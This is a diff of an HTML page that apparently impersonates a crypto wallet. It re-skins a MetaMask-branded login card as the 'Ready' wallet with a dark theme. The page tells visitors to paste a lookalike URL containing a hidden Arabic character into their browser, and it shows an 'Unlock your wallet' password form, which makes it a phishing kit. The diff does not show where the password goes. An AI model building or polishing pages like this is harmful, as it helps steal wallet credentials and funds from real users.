@@ -5,39 +5,40 @@
     <style>
       body {
         font-family: Arial, sans-serif;
-        background-color: #1a1a1a;
+        background-color: #000000;
         padding: 40px;
         text-align: center;
       }
       .card {
-        background-color: white;
+        background-color: #1a1a1a;
         max-width: 420px;
         margin: auto;
         padding: 30px;
         border-radius: 12px;
-        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        box-shadow: 0 4px 12px rgba(255, 107, 53, 0.3);
       }
       .metamask-logo {
         width: 80px;
         margin-bottom: 15px;
       }
       h2 {
-        color: #1a1a1a;
+        color: #ffffff;
         margin-bottom: 10px;
       }
       p {
         font-size: 15px;
-        color: #333;
+        color: #cccccc;
         margin-bottom: 20px;
       }
       .url-box {
-        background: #f5f5f5;
+        background: #2a2a2a;
         padding: 12px;
         border-radius: 6px;
         font-family: monospace;
         font-size: 14px;
-        color: #1a1a1a;
+        color: #ffffff;
         word-break: break-all;
+        border: 1px solid #333;
       }
       button {
         background-color: #ff6b35;
@@ -52,18 +53,20 @@
       .login-container {
         max-width: 380px;
         margin: 60px auto;
-        background: white;
+        background: #1a1a1a;
         padding: 30px;
         border-radius: 10px;
         text-align: center;
-        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        box-shadow: 0 2px 10px rgba(255, 107, 53, 0.2);
       }
       .login-container input {
         width: 90%;
         margin: 10px auto;
         padding: 10px;
         font-size: 14px;
-        border: 1px solid #ccc;
+        border: 1px solid #333;
+        background: #2a2a2a;
+        color: #ffffff;
         border-radius: 6px;
         display: block;
       }
@@ -78,14 +81,14 @@
       }
       .footer {
         font-size: 11px;
-        color: #666;
+        color: #888;
         margin-top: 15px;
       }
     </style>
   </head>
   <body>
     <div class="card">
-      <img class="metamask-logo" src="https://cdn.prod.website-files.com/680f9220d4668b0e40862420/68501db2b0ca6f407c20579f_ready-logo-linear-inverted.svg" alt="MetaMask Logo">
+      <img class="metamask-logo" src="https://cdn.prod.website-files.com/680f9220d4668b0e40862420/68501db2b0ca6f407c20579f_ready-logo-linear-inverted.svg" alt="Ready Logo">
       <h2>Connect with Ready</h2>
       <p>Copy and paste the URL below into your browser's address bar:</p>
       <div class="url-box" id="304url">https://سwallet.ready.co</div>
@@ -109,7 +112,7 @@
     body {
       margin: 0;
       font-family: Arial, sans-serif;
-      background: #1a1a1a;
+      background: #000000;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -117,10 +120,10 @@
     }
 
     .login-container {
-      background: white;
+      background: #1a1a1a;
       padding: 30px;
       border-radius: 12px;
-      box-shadow: 0 5px 25px rgba(0, 0, 0, 0.3);
+      box-shadow: 0 5px 25px rgba(255, 107, 53, 0.3);
       text-align: center;
       width: 300px;
     }
@@ -132,11 +135,11 @@
 
     h2 {
       margin: 10px 0;
-      color: #1a1a1a;
+      color: #ffffff;
     }
 
     p {
-      color: #333;
+      color: #cccccc;
       margin-bottom: 20px;
     }
 
@@ -144,9 +147,15 @@
       width: 100%;
       padding: 10px;
       margin-bottom: 15px;
-      border: 1px solid #ccc;
+      border: 1px solid #333;
+      background: #2a2a2a;
+      color: #ffffff;
       border-radius: 8px;
       font-size: 14px;
+    }
+
+    input[type="password"]::placeholder {
+      color: #888;
     }
 
     button {
@@ -169,13 +178,13 @@
     .footer {
       margin-top: 20px;
       font-size: 12px;
-      color: #666;
+      color: #888;
     }
   </style>
 
   <div class="login-container">
-    <img class="metamask-logo" src="https://cdn.prod.website-files.com/680f9220d4668b0e40862420/68501db2b0ca6f407c20579f_ready-logo-linear-inverted.svg" alt="MetaMask Logo">
-    <h2>MetaMask</h2>
+    <img class="metamask-logo" src="https://cdn.prod.website-files.com/680f9220d4668b0e40862420/68501db2b0ca6f407c20579f_ready-logo-linear-inverted.svg" alt="Ready Logo">
+    <h2>Ready</h2>
     <p>Unlock your wallet</p>
     <input type="password" placeholder="Enter your wallet password" />
     <button type="submit">Unlock</button>
